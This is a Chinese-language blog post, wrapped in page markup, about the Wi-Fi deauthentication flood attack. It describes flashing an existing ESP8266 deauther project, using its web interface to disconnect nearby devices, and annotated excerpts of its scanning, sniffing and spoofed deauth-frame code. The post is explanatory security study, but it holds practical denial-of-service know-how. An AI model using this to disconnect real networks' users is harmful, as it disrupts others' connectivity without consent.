@@ -1,0 +1,612 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+  
+
+    <head>
+      <meta charset="utf-8" />
+        
+      <meta
+        name="viewport"
+        content="width=device-width, initial-scale=1, maximum-scale=1"
+      />
+      <title>无线DOS之取消验证洪水攻击 |  Scorpio-yyz</title>
+  <meta name="generator" content="hexo-theme-ayer">
+      
+      <link rel="shortcut icon" href="/favicon.ico" />
+       
+<link rel="stylesheet" href="/dist/main.css">
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/css/remixicon.min.css"
+      />
+      
+<link rel="stylesheet" href="/css/custom.css">
+ 
+      <script src="https://cdn.jsdelivr.net/npm/pace-js@1.0.2/pace.min.js"></script>
+       
+ 
+
+      <link
+        rel="stylesheet"
+        href="https://cdn.jsdelivr.net/npm/@sweetalert2/theme-bulma@5.0.1/bulma.min.css"
+      />
+      <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.19/dist/sweetalert2.min.js"></script>
+
+      <!-- mermaid -->
+      
+      <style>
+        .swal2-styled.swal2-confirm {
+          font-size: 1.6rem;
+        }
+      </style>
+    </head>
+  </html>
+</html>
+
+
+<body>
+  <div id="app">
+    
+      <canvas class="fireworks"></canvas>
+      <style>
+        .fireworks {
+          position: fixed;
+          left: 0;
+          top: 0;
+          z-index: 99999;
+          pointer-events: none;
+        }
+      </style>
+      
+      
+    <main class="content on">
+      <section class="outer">
+  <article
+  id="post-无线DOS之取消验证洪水攻击"
+  class="article article-type-post"
+  itemscope
+  itemprop="blogPost"
+  data-scroll-reveal
+>
+  <div class="article-inner">
+    
+    <header class="article-header">
+       
+<h1 class="article-title sea-center" style="border-left:0" itemprop="name">
+  无线DOS之取消验证洪水攻击
+</h1>
+ 
+
+      
+    </header>
+     
+    <div class="article-meta">
+      <a href="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/" class="article-date">
+  <time datetime="2021-12-07T11:03:16.000Z" itemprop="datePublished">2021-12-07</time>
+</a> 
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/%E8%BD%AF%E4%BB%B6%E5%AE%89%E5%85%A8/">软件安全</a>
+  </div>
+  
+<div class="word_count">
+    <span class="post-time">
+        <span class="post-meta-item-icon">
+            <i class="ri-quill-pen-line"></i>
+            <span class="post-meta-item-text"> Word count:</span>
+            <span class="post-count">1.6k</span>
+        </span>
+    </span>
+
+    <span class="post-time">
+        &nbsp; | &nbsp;
+        <span class="post-meta-item-icon">
+            <i class="ri-book-open-line"></i>
+            <span class="post-meta-item-text"> Reading time≈</span>
+            <span class="post-count">6 min</span>
+        </span>
+    </span>
+</div>
+ 
+    </div>
+      
+    <div class="tocbot"></div>
+
+
+
+
+  
+    <div class="article-entry" itemprop="articleBody">
+       
+  <h1 id="攻击原理"><a href="#攻击原理" class="headerlink" title="攻击原理"></a>攻击原理</h1><p>​    取消验证洪水攻击，全程为De-authenticationFloodAttack,简称为Deauth攻击。首先，攻击者通过扫描周围的WIFI网络，获取WIFI站点的SSID。然后扫描连接周围连接该网络的设备。最后，对周边网络进行抓包（嗅探），寻找要攻击的WIFI站点和连接该站点的设备，以获取的包头信息重新构造一个取消验证包，发给连接设备。设备会被欺骗，从而取消对AP的连接。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/0.png" class="">
+
+<h1 id="攻击实现"><a href="#攻击实现" class="headerlink" title="攻击实现"></a>攻击实现</h1><p>​    参考已有的张馆长的工程，将其烧录到esp8266模块上。<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/1.jpg" class=""></p>
+<p>简单配置一下</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/2.jpg" class="">
+
+<p>烧录</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/3.jpg" class="">
+
+<p>这时，esp8266会建立一个WIFI，</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/4.jpg" class="">
+
+<p>我们连接这个wifi，进入192.168.4.1，可以看到攻击界面，里面会显示当前的AP，我们选取一个作为攻击对象。这里我们设置的是无差别攻击。当我们要定点攻击时，需要扫描连接该WiFi的设备，选择一个攻击。</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/5.jpg" class="">
+
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/6.jpg" class="">
+
+<p>​        选择Deauth攻击，然后我们就可以观察到连接该网的设备断连的现象，手机上方的WiFi图标会不断闪烁。</p>
+<h1 id="代码架构"><a href="#代码架构" class="headerlink" title="代码架构"></a>代码架构</h1><p>首先，WIFI模块有两种工作模式：</p>
+<p>ap是无线发射端，station是接收端，两种模式组建成一个无线局域网。</p>
+<ol>
+<li>ap mode 通常应用在无线局域网成员设备（即客户端）的加入，即<strong>网络下行</strong>。它提供以无线方式组建无线局域网 WLAN，相当际 <strong>WLAN 的中心设备</strong>。AP和AP之间允许相互连接。</li>
+<li>station mode即工作站模式，可以理解为某个网格中的一个工作站即<strong>客户端</strong>，<strong>网络上行</strong>。那当一个 WIFI 芯片提供这个功能时，它就可以连到另外的一个网络当中，如家用路由器。通常用于提供网络的数据上行服务。</li>
+</ol>
+<p>代码的核心是扫描、嗅探和伪造。扫描站点，嗅探（抓包）和通过。</p>
+<p>首先是扫描：</p>
+<p>​    AP模式扫描周围的AP。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line">	<span class="comment">/* AP Scan */</span></span><br><span class="line">    <span class="keyword">if</span> ((mode == SCAN_MODE_APS) || (mode == SCAN_MODE_ALL)) &#123;</span><br><span class="line">        <span class="comment">// remove old results</span></span><br><span class="line">        accesspoints.removeAll();</span><br><span class="line">        stations.removeAll();</span><br><span class="line">        <span class="comment">// start AP scan</span></span><br><span class="line">        prntln(SC_START_AP);</span><br><span class="line">        WiFi.scanNetworks(<span class="literal">true</span>, <span class="literal">true</span>);</span><br><span class="line">        <span class="comment">/*该函数可以扫描到ESP8266开发板所在环境中的可用WIFI网络，并且将WiFi网络信息保存到内存中。通过调用SSID、RSSI等函数，我们还可以得到这些扫描到的WIFI的更多信息。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>​    station模式开启后可以开启混杂模式（混杂模式（英语：promiscuous mode）是电脑网络中的术语。是指一台机器的网卡能够接收所有经过它的数据流，而不论其目的地址是否是它。），从而为嗅探作准备</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#scan.cpp</span></span><br><span class="line"><span class="comment">/* Station Scan */</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (mode == SCAN_MODE_STATIONS) &#123;</span><br><span class="line">        <span class="comment">// start station scan</span></span><br><span class="line">        <span class="keyword">if</span> (accesspoints.count() &lt; <span class="number">1</span>) &#123;</span><br><span class="line">            start(SCAN_MODE_ALL);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;<span class="comment">//如果当前网络没有AP,返回重新扫描，因为我们需要先确定攻击的AP再确定攻击的设备，如果在嗅探前AP已经不存在了，则没有继续的必要</span></span><br><span class="line">        snifferStartTime = currentTime;</span><br><span class="line">        prnt(SC_START_CLIENT);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (sniffTime &gt; <span class="number">0</span>) prnt(String(sniffTime / <span class="number">1000</span>) + S);</span><br><span class="line">        <span class="keyword">else</span> prnt(SC_INFINITELY);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!channelHop) &#123;</span><br><span class="line">            prnt(SC_ON_CHANNEL);</span><br><span class="line">            prnt(wifi_channel);</span><br><span class="line">        &#125;</span><br><span class="line">        prntln();</span><br><span class="line">        wifi::stopAP();</span><br><span class="line">        wifi_promiscuous_enable(<span class="literal">true</span>);<span class="comment">//开启混杂模式</span></span><br><span class="line">    	<span class="comment">/*混杂模式就是接收所有经过网卡的数据包，包括不是发给本机的包。默认情况下网卡只把发给本机的包（包括广播包）传递给上层程序，其它的包一律丢弃。但是混杂模式就是指网卡能接受所有通过它的数据流，不管是什么格式，什么地址的。事实上，计算机收到数据包后，由网络层进行判断（这里是802.11系协议），确定是递交上层（传输层），还是丢弃，还是递交下层（数据链路层、MAC子层）转发。*/</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入嗅探模式：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">Scan::sniffer</span><span class="params">(<span class="keyword">uint8_t</span>* buf, <span class="keyword">uint16_t</span> len)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!isSniffing()) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    packets++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (len &lt; <span class="number">28</span>) <span class="keyword">return</span>;  <span class="comment">// 丢弃掉过短的数据包</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0xc0</span>) || (buf[<span class="number">12</span>] == <span class="number">0xa0</span>)) &#123;</span><br><span class="line">        tmpDeauths++;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 丢弃信标帧、探测请求/响应和解除授权/解除关联帧</span></span><br><span class="line">    <span class="keyword">if</span> ((buf[<span class="number">12</span>] == <span class="number">0x80</span>) || (buf[<span class="number">12</span>] == <span class="number">0x40</span>) || (buf[<span class="number">12</span>] == <span class="number">0x50</span>) <span class="comment">/* || buf[12] == 0xc0 || buf[12] == 0xa0*/</span>) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 只允许数据帧</span></span><br><span class="line">    <span class="comment">// if(buf[12] != 0x08 &amp;&amp; buf[12] != 0x88) return;数据帧12位为08和88的时候说明是数据帧，如果都不是，可以丢弃，但作者将这句话注释了，不知道原因。。。</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span>* macTo   = &amp;buf[<span class="number">16</span>];<span class="comment">//该数据包要去哪</span></span><br><span class="line">    <span class="keyword">uint8_t</span>* macFrom = &amp;buf[<span class="number">22</span>];<span class="comment">//该数据包从哪来</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (macBroadcast(macTo) || macBroadcast(macFrom) || !macValid(macTo) || !macValid(macFrom) || macMulticast(macTo) ||</span><br><span class="line">        macMulticast(macFrom)) <span class="keyword">return</span>;</span><br><span class="line">	<span class="comment">//Broadcast所谓广播地址指同时向网上所有的主机发送报文，也就是说，不管物理网络特性如何，internet网都支持广播传输。这里表示如果收发地址为广播地址，则丢弃。</span></span><br><span class="line">    <span class="comment">//Multicast是一个群组传播模式。。。其他的看不懂了，和上面区别不大。也丢弃。</span></span><br><span class="line">    <span class="comment">//上面两种的特点都是一对多模式，而我们只需要要截获一对一的数据包，并认为该mac为有效mac地址。</span></span><br><span class="line">    <span class="keyword">int</span> accesspointNum = findAccesspoint(macFrom);<span class="comment">//查看该mac地址有几个AP。这个如果小于0说明该mac地址是连接AP的设备</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        stations.add(macTo, accesspoints.getID(accesspointNum));</span><br><span class="line">        <span class="comment">//macForm为AP了，那么macTo肯定为设备，我们将该设备的mac加入列表。</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;  <span class="comment">//如果AP数量为0，那么macTo是AP，macForm为设备，</span></span><br><span class="line">        accesspointNum = findAccesspoint(macTo);</span><br><span class="line">        <span class="comment">//这两个if判断谁是AP谁是设备，写的很垃圾</span></span><br><span class="line">        <span class="keyword">if</span> (accesspointNum &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">            stations.add(macFrom, accesspoints.getID(accesspointNum));</span><br><span class="line">            <span class="comment">//我们将该设备的mac加入列表。</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="802-11协议"><a href="#802-11协议" class="headerlink" title="802.11协议"></a>802.11协议</h2><img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/7.png" class="">
+
+<p>以上是我们需要构造的mac帧头格式</p>
+<img src="/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/8.png" class="">
+
+<p>准确的说，我们需要向设备发送取消验证包。地址1应该是DA（设备mac），地址2是BSSID（伪造成APmac），地址3源地址（还是APmac）</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#attack.cpp</span></span><br><span class="line"><span class="function"><span class="keyword">bool</span> <span class="title">Attack::deauthDevice</span><span class="params">(<span class="keyword">uint8_t</span>* apMac, <span class="keyword">uint8_t</span>* stMac, <span class="keyword">uint8_t</span> reason, <span class="keyword">uint8_t</span> ch)</span> </span>&#123;</span><br><span class="line">	······</span><br><span class="line">    <span class="comment">// build deauth packet</span></span><br><span class="line">    packetSize = <span class="keyword">sizeof</span>(deauthPacket);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">uint8_t</span> deauthpkt[packetSize];</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(deauthpkt, deauthPacket, packetSize);<span class="comment">//构造mac帧头，初始数据见下</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">4</span>], stMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">10</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;deauthpkt[<span class="number">16</span>], apMac, <span class="number">6</span>);</span><br><span class="line">    deauthpkt[<span class="number">24</span>] = reason;</span><br><span class="line">    ······</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#attack.h</span></span><br><span class="line"><span class="keyword">uint8_t</span> deauthPacket[<span class="number">26</span>] = &#123;</span><br><span class="line">            <span class="comment">/*  0 - 1  */</span> <span class="number">0xC0</span>, <span class="number">0x00</span>,</span><br><span class="line">            <span class="comment">/*  2 - 3  */</span> <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">            <span class="comment">/*  4 - 9  */</span> <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>, <span class="number">0xFF</span>,</span><br><span class="line">            <span class="comment">/* 10 - 15 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 16 - 21 */</span> <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>, <span class="number">0xCC</span>,</span><br><span class="line">            <span class="comment">/* 22 - 23 */</span> <span class="number">0x00</span>, <span class="number">0x00</span>,                         </span><br><span class="line">            <span class="comment">/* 24 - 25 */</span> <span class="number">0x01</span>, <span class="number">0x00</span>                         </span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure>
+
+ 
+      <!-- reward -->
+      
+    </div>
+    
+
+    <!-- copyright -->
+    
+    <div class="declare">
+      <ul class="post-copyright">
+        <li>
+          <i class="ri-copyright-line"></i>
+          <strong>Copyright： </strong>
+          
+          Copyright is owned by the author. For commercial reprints, please contact the author for authorization. For non-commercial reprints, please indicate the source.
+          
+        </li>
+      </ul>
+    </div>
+    
+    <footer class="article-footer">
+       
+<div class="share-btn">
+      <span class="share-sns share-outer">
+        <i class="ri-share-forward-line"></i>
+        分享
+      </span>
+      <div class="share-wrap">
+        <i class="arrow"></i>
+        <div class="share-icons">
+          
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="ri-weibo-fill"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="ri-wechat-fill"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="ri-qq-fill"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="ri-douban-line"></i>
+          </a>
+          <!-- <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a> -->
+          
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="ri-facebook-circle-fill"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="ri-twitter-fill"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="ri-google-fill"></i>
+          </a>
+        </div>
+      </div>
+</div>
+
+<div class="wx-share-modal">
+    <a class="modal-close" href="javascript:;"><i class="ri-close-circle-line"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//api.qrserver.com/v1/create-qr-code/?size=150x150&data=http://example.com/2021/12/07/%E6%97%A0%E7%BA%BFDOS%E4%B9%8B%E5%8F%96%E6%B6%88%E9%AA%8C%E8%AF%81%E6%B4%AA%E6%B0%B4%E6%94%BB%E5%87%BB/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div id="share-mask"></div>  
+    </footer>
+  </div>
+
+   
+  <nav class="article-nav">
+    
+      <a href="/2021/12/09/%E8%AE%BA%E6%96%87%E7%AC%94%E8%AE%B0%EF%BC%9AFallout-Leaking-Data-on-Meltdown-resistant-CPUs/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            Fallout: Leaking Data on Meltdown-resistant CPUs 论文笔记
+          
+        </div>
+      </a>
+    
+    
+  </nav>
+
+   
+ 
+   
+     
+</article>
+
+</section>
+      <footer class="footer">
+  <div class="outer">
+    <ul>
+      <li>
+        Copyrights &copy;
+        2020-2023
+        <i class="ri-heart-fill heart_icon"></i> YYz
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+      </li>
+    </ul>
+    <ul>
+      <li>
+        
+        
+        <span>
+  <span><i class="ri-user-3-fill"></i>Visitors:<span id="busuanzi_value_site_uv"></span></span>
+  <span class="division">|</span>
+  <span><i class="ri-eye-fill"></i>Views:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/images/ayer-side.svg" alt="Scorpio-yyz"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/friends">友链</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="Search">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+</div>
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="https://cdn.jsdelivr.net/gh/Shen-Yu/cdn/img/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.jsdelivr.net/npm/jquery-modal@0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css">
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"></script>
+<script src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
